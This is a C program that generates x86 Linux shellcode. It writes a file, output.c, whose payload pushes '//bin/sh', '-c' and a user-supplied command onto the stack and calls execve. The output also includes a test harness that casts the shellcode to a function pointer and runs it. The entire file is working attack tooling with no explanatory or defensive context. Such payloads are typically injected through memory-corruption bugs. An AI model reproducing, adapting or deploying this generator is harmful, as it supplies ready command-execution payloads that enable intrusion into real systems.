#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]){
	if(argc == 2){

		//find how many padding spaces needed
		int paddingNeeded = (4 -((strlen(argv[1]))%4));

		//extra one for null byte
		char *shellcode = calloc((strlen(argv[1])+paddingNeeded+1),sizeof(char));

		//add in arg passed in
		strncpy(&shellcode[0],argv[1],strlen(argv[1]));

		//add space padding at end of str
		for(int i = 0;i < paddingNeeded; i = i +1){
			strncpy(&shellcode[(i+strlen(argv[1]))]," ",1);
		}

		FILE *f;
		f = fopen("output.c","w");
		fprintf(f, "%s\n","#include <stdio.h>");
		fprintf(f, "%s\n\n","#include <unistd.h>");
		fprintf(f, "%s","char *shellcode=\"");
		fprintf(f, "%s\"//xor eax,eax\n","\\x31\\xc0");

		//push //bin/sh onto the stack and set arg 1 of execve to point to it
		fprintf(f, "\"%s\" //push eax\n","\\x50");
		fprintf(f, "\"%s\" //push 'n/sh'\n","\\x68\\x6e\\x2f\\x73\\x68");
		fprintf(f, "\"%s\" //push '//bi'\n","\\x68\\x2f\\x2f\\x62\\x69");
		fprintf(f, "\"%s\" //mov esp,ebx\n","\\x89\\xe3");

		//push the agruement -c onto the stack and save addr that points to it
		fprintf(f, "\"%s\" //push eax\n","\\x50");
		fprintf(f, "\"%s\" //pushw $0x632d\n","\\x66\\x68\\x2d\\x63");
		fprintf(f, "\"%s\" //mov esp,ecx\n","\\x89\\xe1");

		//push the passed in arg onto the stack and save the addr that points to it
		fprintf(f, "\"%s\" //push eax\n","\\x50");
		for(int i = (strlen(shellcode)); i > 0; i = i - 4){
			fprintf(f,"\"%s","\\x68");
			fprintf(f,"\\x%x",shellcode[i-4]);
			fprintf(f,"\\x%x",shellcode[i-3]);
			fprintf(f,"\\x%x",shellcode[i-2]);
			fprintf(f,"\\x%x\"",shellcode[i-1]);
			//write comment of what assembly is
			fprintf(f," //push '%c%c%c%c'\n",shellcode[i-4],shellcode[i-3],shellcode[i-2],shellcode[i-1]);
		}
		fprintf(f, "\"%s\" //mov esp,edx\n","\\x89\\xe2");

		//create the char [] of args and set 2nd syscall arg to it
		fprintf(f, "\"%s\" //push eax\n","\\x50");
		fprintf(f, "\"%s\" //push edx\n","\\x52");
		fprintf(f, "\"%s\" //push ecx\n","\\x51");
		fprintf(f, "\"%s\" //push ebx\n","\\x53");
		fprintf(f, "\"%s\" //mov esp,ecx\n","\\x89\\xe1");

		//point the 3rd env syscall arg to null
		fprintf(f, "\"%s\" //push eax\n","\\x50");
		fprintf(f, "\"%s\" //mov esp,edx\n","\\x89\\xe2");

		//call execve
		fprintf(f, "\"%s\" //mov $0xb,al\n","\\xb0\\x0b");
		fprintf(f, "\"%s\"; //int $0x80\n\n","\\xcd\\x80");

		fprintf(f, "%s\n","int main(){");
		fprintf(f, "%s\n","    int (*ret)() = (int(*)())shellcode;");
		fprintf(f, "%s\n","    ret();");
		fprintf(f, "%s\n","}");
		fclose(f);
	}else{
		printf("%s\n","Needs an arg.");
	}
}
